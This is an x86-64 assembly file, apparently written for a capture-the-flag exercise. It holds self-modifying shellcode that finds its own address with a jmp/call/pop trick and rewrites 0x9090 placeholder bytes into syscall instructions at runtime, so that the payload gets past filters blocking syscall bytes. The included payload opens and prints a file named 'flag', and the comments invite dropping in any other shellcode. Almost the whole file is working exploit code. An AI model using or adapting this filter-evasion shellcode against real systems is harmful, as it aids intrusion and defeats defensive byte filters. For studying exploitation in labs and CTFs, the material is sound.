.globl _start
.intel_syntax noprefix

_start:
    jmp stackPosition

modify:
    /* Pop and save IP to return to later */
    pop rdx 
    mov rsi, rdx

    /* RCX will be used to check for the end condition */
    mov rcx, 0x4141414141414141

createSyscalls:
    /* move memory from RDX into rax and check for 0x9090 */
    xor rax, rax
    mov rax, [rdx]
    cmp ax, 0x9090
    jne inc_ct

    /* 0x9090 - 0x8b81 = 0x0f05 = syscall */
    sub ax, 0x8B81
    mov [rdx], rax

inc_ct:
    /* increase dl (low byte of RDX) to get to next memory address and check for end condition*/
    inc dl
    cmp rax, rcx
    jne createSyscalls

    /* jump back to IP id end condition is met */
    jmp rsi

stackPosition:
    /* push IP */
    call modify

payload:
    /*Add any shell code below and change the syscalls to .ascii "\x90\x90".
    The Program will find the noops and change them into sycall instructions.
    Current payload cats a file called "flag" (Gotten from shellcraft) */

    /* push b'flag\x00' */
    push 0x67616c66
    /* call open('rsp', 'O_RDONLY', 'rdx') */
    push 2 /*SYS_open*/
    pop rax
    mov rdi, rsp
    xor esi, esi /* O_RDONLY */
    .ascii "\x90\x90"
    /* call sendfile(1, 'rax', 0, 0x7fffffff) */
    mov r10d, 0x7fffffff
    mov rsi, rax
    push 0x28 /* SYS_sendfile */
    pop rax
    push 1
    pop rdi
    cdq /* rdx=0 */
    .ascii "\x90\x90"
    .ascii "AAAAAAAA"